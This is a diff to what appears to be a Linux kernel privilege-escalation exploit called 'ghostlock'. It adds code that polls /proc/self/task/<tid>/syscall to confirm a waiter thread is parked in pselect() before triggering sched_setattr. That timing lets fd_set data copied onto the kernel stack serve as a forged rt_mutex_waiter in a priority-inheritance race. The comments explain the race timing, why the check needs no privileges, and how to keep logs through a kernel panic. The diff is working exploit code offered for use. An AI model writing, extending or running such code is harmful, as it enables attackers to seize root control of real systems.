@@ -11,10 +11,58 @@
 #include "route/route_controller.h"
 #include "route/route_policy.hpp"
 #include "session/exploit_session.hpp"
+#include "support/syscall_snapshot.hpp"
 
 using namespace ghostlock;
 
 namespace ghostlock::race {
+    namespace {
+        /* Path A gate.
+         *
+         * The select_stack route arms the consumer before the waiter thread
+         * enters pselect(), so the fd_set words only become the crafted
+         * rt_mutex_waiter once the syscall has copied them onto the kernel
+         * stack. Firing sched_setattr before that walks a half-built waiter,
+         * and a fixed delay only guesses at the moment. /proc/<tid>/syscall
+         * states it instead of guessing: a task parked inside a syscall
+         * prints nine fields and the syscall number, so waiting for that
+         * number is a confirmation. Same-thread-group access never reaches
+         * the security checks (ptrace_may_access() returns early for it), so
+         * a sibling thread can read it with no privileges at all.
+         *
+         * Returns true only when the snapshot proved it. */
+        [[nodiscard]] bool wait_for_waiter_syscall(
+            int32_t tid, int32_t number, uint32_t timeout_usec) {
+            if (tid <= 0 || number < 0 || timeout_usec == 0) {
+                return false;
+            }
+            char path[64];
+            snprintf(path, sizeof(path), "/proc/self/task/%d/syscall", tid);
+            const uint32_t poll_usec =
+                session::g_exploit_session.profile.race_state_poll_interval_us();
+            struct timespec start;
+            clock_gettime(CLOCK_MONOTONIC, &start);
+            for (;;) {
+                /* Kernel-space arguments print as 0x + 16 hex digits, so the
+                 * nine-field form reaches ~157 bytes; anything shorter can
+                 * truncate a real snapshot into an unparsable one. */
+                char snapshot[256];
+                support::read_first_line(path, snapshot, sizeof(snapshot));
+                const support::SyscallSnapshot parsed =
+                    support::parse_syscall_snapshot(snapshot);
+                if (parsed.kind == support::SyscallSnapshotKind::Sleeping &&
+                    parsed.number == number) {
+                    return true;
+                }
+                if (runtime_time::runtime_elapsed_ms(&start) >=
+                    static_cast<double>(timeout_usec) / 1000.0) {
+                    return false;
+                }
+                usleep(static_cast<useconds_t>(poll_usec ? poll_usec : 1000));
+            }
+        }
+    } // namespace
+
     void *waiter_thread(void *arg) {
         auto *race = static_cast<PiRace *>(arg);
         const memory::WriteRequest *request = race->request;
@@ -117,7 +165,33 @@ namespace ghostlock::race {
             while (!race->consumer_stop.load() &&
                    race->consumer_go.load() == seq) {
                 uint32_t delay_usec = race->route_delay_usec.load();
-                if (delay_usec > 0) usleep(static_cast<useconds_t>(delay_usec));
+                /* Path A gate: a confirmed syscall snapshot replaces the blind
+                 * delay, because firing before the waiter parked leaves the
+                 * crafted words still in user memory. A timeout keeps the old
+                 * behaviour, so an unreadable /proc costs nothing. */
+                bool confirmed = false;
+                const int32_t gate_syscall = race->consumer_gate_syscall.load();
+                if (gate_syscall > 0) {
+                    const uint32_t gate_timeout_usec =
+                        session::g_exploit_session.profile.select_timeout_us();
+                    confirmed = wait_for_waiter_syscall(tid, gate_syscall, gate_timeout_usec);
+                    if (confirmed) {
+                        pr_info("consumer gate: waiter parked in syscall %d\n",
+                                gate_syscall);
+                    } else {
+                        pr_warning("consumer gate: waiter not in syscall %d after "
+                                   "%uus; falling back to the delay ladder\n",
+                                   gate_syscall, gate_timeout_usec);
+                    }
+                    /* The verdict decides whether this attempt is a real race
+                     * or a guess, so push it past the stdio buffer: a panic
+                     * takes the page cache with it and this is the line that
+                     * says which of the two happened. */
+                    support::log_sync();
+                }
+                if (!confirmed && delay_usec > 0) {
+                    usleep(static_cast<useconds_t>(delay_usec));
+                }
                 for (uint32_t burst = 0;
                      burst < session::g_exploit_session.profile.select_consumer_burst_calls(); burst++) {
                     if (race->consumer_stop.load() ||
